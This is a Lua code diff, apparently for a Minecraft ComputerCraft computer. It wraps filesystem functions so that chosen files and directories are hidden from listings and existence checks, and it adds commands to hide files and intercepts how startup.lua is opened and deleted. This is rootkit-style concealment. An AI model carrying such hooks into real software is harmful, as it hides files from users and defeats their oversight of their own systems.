@@ -12,21 +12,54 @@ local fs = native
 for k, v in pairs(native) do fs[k] = v end
 
 local hiddenDirs = {}
+local hiddenFiles = {}
 local originalStartup = "startup1.lua"
 
 -- Helper function to check if a path is hidden
 local function isHidden(path)
     for _, dir in ipairs(hiddenDirs) do
-        -- Check if the path is the directory itself or inside a hidden directory
         if fs.combine("", path) == dir or string.sub(fs.combine("", path), 1, #dir + 1) == dir .. "/" then
+            return true
+        end
+    end
+    for _, file in ipairs(hiddenFiles) do
+        if fs.combine("", path) == file then
             return true
         end
     end
     return false
 end
 
+
+
 -- Define the hidden commands and their implementations
 local hiddenCommands = {}
+
+
+-- Function to hide a file
+hiddenCommands.hideFile = function(path)
+    if fs.isDir(path) then
+        error("Cannot hide: " .. path .. " is a directory.", 2)
+    end
+    local normalizedPath = fs.combine("", path)
+    for _, file in ipairs(hiddenFiles) do
+        if file == normalizedPath then
+            return
+        end
+    end
+    table.insert(hiddenFiles, normalizedPath)
+end
+
+-- Function to unhide a file
+hiddenCommands.unhideFile = function(path)
+    local normalizedPath = fs.combine("", path)
+    for i, file in ipairs(hiddenFiles) do
+        if file == normalizedPath then
+            table.remove(hiddenFiles, i)
+            return
+        end
+    end
+end
 
 -- Function to hide a directory
 hiddenCommands.hideDir = function(path)
@@ -74,6 +107,8 @@ local hiddenCommands = {
     hideDir = true,
     unhideDir = true,
     setOriginalStartup = true,
+    hideFile = true,
+    unhideFile = true,
 }
 
 if shell and shell.complete then
@@ -117,15 +152,15 @@ setmetatable(fs, {
 -- Wrapper for fs.list to exclude hidden directories
 local oldList = native.list
 function fs.list(path)
-    local files = oldList(path)
-    local visibleFiles = {}
-    for _, file in ipairs(files) do
-        local fullPath = fs.combine(path, file)
+    local items = oldList(path)
+    local visibleItems = {}
+    for _, item in ipairs(items) do
+        local fullPath = fs.combine(path, item)
         if not isHidden(fullPath) then
-            table.insert(visibleFiles, file)
+            table.insert(visibleItems, item)
         end
     end
-    return visibleFiles
+    return visibleItems
 end
 
 -- Wrapper for fs.exists to account for hidden directories
@@ -146,13 +181,38 @@ function fs.isDir(path)
     return oldIsDir(path)
 end
 
--- Redirect startup.lua checks to another file
-local oldOpen = native.open
+-- Monitor startup.lua creation and deletion
+local originalOpen = native.open
 function fs.open(path, mode)
-    if fs.combine("", path) == fs.combine("", "startup.lua") then
-        return oldOpen(originalStartup, mode)
+    local normalizedPath = fs.combine("", path)
+    if normalizedPath == "startup.lua" then
+        if mode == "w" or mode == "wb" then
+            -- File is being created or overwritten
+            for i, file in ipairs(hiddenFiles) do
+                if file == normalizedPath then
+                    table.remove(hiddenFiles, i)
+                    break
+                end
+            end
+            local handle = originalOpen(normalizedPath, mode)
+            handle.close() -- Immediately close after clearing
+            return originalOpen(normalizedPath, mode) -- Return a new handle for the write
+        elseif mode == nil and not fs.exists(normalizedPath) then
+            -- File is being opened in read mode but does not exist
+            hiddenCommands.hideFile(normalizedPath) -- Hide the file if it does not exist
+        end
     end
-    return oldOpen(path, mode)
+    return originalOpen(path, mode)
+end
+
+-- Wrapper for fs.delete to hide the startup.lua file when deleted
+local originalDelete = native.delete
+function fs.delete(path)
+    local normalizedPath = fs.combine("", path)
+    if normalizedPath == "startup.lua" and fs.exists(normalizedPath) then
+        hiddenCommands.hideFile(normalizedPath) -- Hide the file if it is deleted
+    end
+    originalDelete(path)
 end
 
 -- Wrapper for fs.find to exclude hidden directories
